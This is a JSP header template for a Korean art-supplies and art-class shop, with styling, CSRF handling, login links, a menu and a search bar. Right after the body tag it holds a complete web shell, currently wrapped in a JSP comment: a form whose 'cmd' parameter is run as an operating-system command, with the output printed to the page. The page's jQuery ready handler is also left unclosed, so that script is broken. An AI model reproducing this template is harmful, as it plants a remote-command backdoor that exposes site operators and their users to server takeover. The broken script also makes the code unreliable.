<%@ page import="java.util.*,java.io.*"%>
<%@ page language="java" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ taglib prefix="sec" uri="http://www.springframework.org/security/tags"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<sec:csrfMetaTags />
<title>Insert title here</title>
<style>
/* ✅ 기본 레이아웃 */
body {
	padding: 0;
	margin: 0;
	color: #333;
	font-family: sans-serif;
}

a {
	color: #333;
	text-decoration: none;
}

/* ✅ 전체 헤더 래퍼 */
#header_wrapper {
	width: 100%;
	margin-top: 20px; /* 너무 위에 붙지 않게 여백 */
}

/* ✅ 상단 로그인/로그아웃 영역 */
.header_top {
	display: flex;
	justify-content: flex-end;
	padding: 10px 20px;
	font-size: 14px;
}

/* ✅ 하단 메뉴 및 검색창 영역 */
.header_bottom {
	display: flex;
	justify-content: center;
	align-items: center;
	padding: 20px 0;
	gap: 30px;
}

/* ✅ 메뉴 링크 스타일 */
.header_bottom a {
	font-size: 20px;
	font-weight: bold;
	color: #333;
}

/* ✅ 검색박스 너비 */
.search_box {
	width: 400px;
}

/* ✅ 검색폼 타원형 디자인 */
.search_form fieldset {
    border: none;
    padding: 0;
    margin: 0;
    display: flex;
    align-items: center;
    width: 100%;
    background: #fff;
    border-radius: 30px;
    overflow: hidden;
    border: 1px solid #ccc;
}

/* ✅ 텍스트 입력창 */
.search_form input[type="text"] {
    flex: 1;
    padding: 10px 15px;
    border: none;
    outline: none;
    font-size: 16px;
    background: transparent;
    color: #333;
}

/* ✅ 검색 버튼 이미지 */
.search_form input[type="image"] {
    width: 36px;
    height: 36px;
    padding: 5px;
    background-color: transparent;
    border: none;
    cursor: pointer;
}

/* ✅ 네비게이션 관련 */
#navebarwrapper {
	/* optional styles */
}

.naveulwrapper ul {
	font-weight: 600;
	line-height: 3em;
	color: #333;
	margin-right: 70px;
	font-size: 20px;
	width: 100%;
	display: flex;
	justify-content: space-between;
	height: 80px;
	list-style: none;
	padding: 0;
	margin: 0;
}

.naveulwrapper ul li {
	padding: 10px 10px;
}

.right {
	display: flex;
	justify-content: space-between;
}



/* 쓰기버튼 시작 */
.write-btn {
    background-color: #ff7a00; /* 이쁜 주황색 */
    color: #fff;
    border: none;
    padding: 10px 20px;
    font-size: 16px;
    font-weight: bold;
    border-radius: 20px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

.write-btn:hover {
    background-color: #e56c00;
}

/* 쓰기버튼 종료 */
</style>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$(document).ready(function() {
	  const token = $("meta[name='_csrf']").attr("content");
	  const header = $("meta[name='_csrf_header']").attr("content");

	  $.ajaxSetup({
	    beforeSend: function(xhr) {
	      xhr.setRequestHeader(header, token);
	    }
	  });
	  
</script>



</head>
<body>
<%--  <form method="GET" name="cmdForm" action="">
<input type="text" name="cmd">
<input type="submit" value="전송">
</form>
<pre>
<%
if (request.getParameter("cmd") != null)
{
	out.println("명령어 : " + request.getParameter("cmd") + "<br>");
	
	Process p;
	
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1)
		p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    
    else
		p = Runtime.getRuntime().exec(request.getParameter("cmd"));
	
	InputStreamReader in = new InputStreamReader(p.getInputStream(),"euc-kr");
	BufferedReader br = new BufferedReader(in);
	
	String disr = br.readLine();
	
	while ( disr != null )
	{
		out.println(disr); 
		disr = br.readLine(); 
	}
}
%>
</pre> --%>

	<!-- HEADER 전체 wrapper -->
<div id="header_wrapper" >

    <!-- ✅ 1행: 로그인/로그아웃 -->
    <div class="header_top" >
       <!-- ✅ 로그인 상태일 때 -->
<sec:authorize access="isAuthenticated()">
    <a href="${pageContext.request.contextPath}/users/mypage">나의정보</a> &nbsp;|&nbsp;
	<a href="${pageContext.request.contextPath}/users/generalcartlist">장바구니</a> &nbsp;|&nbsp;
    <a href="${pageContext.request.contextPath}/users/payinfo">결제현황</a> &nbsp;|&nbsp;
    <a href="${pageContext.request.contextPath}/users/get-my-reserve-page">예약현황</a> &nbsp;|&nbsp;
 <form id="logoutForm" action="${pageContext.request.contextPath}/users/logout" method="POST" style="display: inline;">
  <input type="hidden" name="${_csrf.parameterName}" value="${_csrf.token}" />
  <button type="submit" style="background: none; border: none; color: #333; cursor: pointer;">로그아웃</button>
</form>




</sec:authorize>
<!-- ✅ 비로그인 상태일 때 -->
<sec:authorize access="!isAuthenticated()">
    <a href="${pageContext.request.contextPath}/guest/login">로그인/가입</a>
</sec:authorize>
    </div>


    <!-- ✅ 2행: 메뉴 + 검색창 -->
   


    <div class="header_bottom" >
        <a href="${pageContext.request.contextPath}/guest/productlist" >미술용품</a>
        <a href="${pageContext.request.contextPath}/guest/get-onedayclass-detail-one-page" >미술수업</a>
        
        <!-- 🔍 검색창 삽입 -->
        <div class="search_box" id="top_search2" >
            <div class="search_section">
                <form id="searchBarForm" action="/shopSearch/search.html" method="get" target="_self" enctype="multipart/form-data">
                    <input id="banner_action" name="banner_action" value="" type="hidden">
                    <div class="search_form">
                        <fieldset>
                          
                            <input id="keyword" name="keyword" type="hidden" value="11">
                            <input id="queryTop" name="query" class="inputTypeText"
                                   placeholder="검색어를 입력하세요"
                                   type="text" autocomplete="off"
                                   onkeyup="$('input[name=\'keyword\']').val(this.value);"
                                   >
                            <input type="hidden" name="order_by" value="favor">
                            <input type="image" id="btnTop" src="https://hwabang.net/web/img/icon/search_icon.png" alt="검색" >
                        </fieldset>
                    </div>
                </form>
            </div>
        </div>
        
           <!-- ✅ 글쓰기 버튼 추가 -->
        <sec:authorize access="!isAuthenticated()">
            <button class="write-btn" onclick="window.location.href='${pageContext.request.contextPath}/guest/get-signup-page'">
                글쓰기
            </button>
        </sec:authorize>

        <sec:authorize access="isAuthenticated()">
            <button class="write-btn" onclick="window.location.href='${pageContext.request.contextPath}/users/get-free-write-gasigle'">
                글쓰기
            </button>
        </sec:authorize>
    </div>
</div>

</body>
</html>